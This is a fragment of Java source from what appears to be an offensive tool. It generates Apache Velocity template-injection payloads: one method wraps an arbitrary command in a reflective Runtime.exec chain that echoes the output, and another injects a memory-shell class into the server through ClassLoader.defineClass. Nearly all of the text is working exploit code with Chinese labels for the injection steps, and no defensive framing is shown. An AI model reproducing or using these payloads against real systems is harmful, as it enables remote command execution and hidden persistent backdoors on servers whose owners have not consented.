...
public class VelocityExpr implements IExpr {
    ...
    public String[] genExecWithEcho(String command) {
        return new String[]{
                ...
                out("#set($x='') $x.class.forName('javax.script.ScriptEngineManager').declaredConstructors[0].newInstance().getEngineByName('js').eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"" + escape(command, "\"") + "\").getInputStream()).useDelimiter(\"/\").next();')")
        };
    }
    ...
    public String[] genMemShell(byte[] memShellClass) {
        try {
            ...
            return new String[]{
                    "[+] 反射方案(该方案注射语句仅可执行一次，第二次需使用实例化语句【后附】)：==>" + System.lineSeparator() + out("#set($x='" + bIMemShellClassFactory.getPayload() + "') #set($ic=$x.class.forName(\"java.lang.Integer\")) #set($cl=$x.class.forName(\"java.lang.ClassLoader\")) #set($m1=$cl.getDeclaredMethod(\"defineClass\", $x.class.forName(\"[B\"), $ic.getField(\"TYPE\").get(1),$ic.getField(\"TYPE\").get(1))) $m1.setAccessible(true) #set($cb=$x.class.forName(\"java.math.BigInteger\").getConstructor($x.class, $ic.getField(\"TYPE\").get(1)).newInstance($x,36).toByteArray()) $m1.invoke($x.class.forName(\"java.lang.Thread\").currentThread().getContextClassLoader(), $cb, 0, " + memShellClass.length + ").newInstance()") +
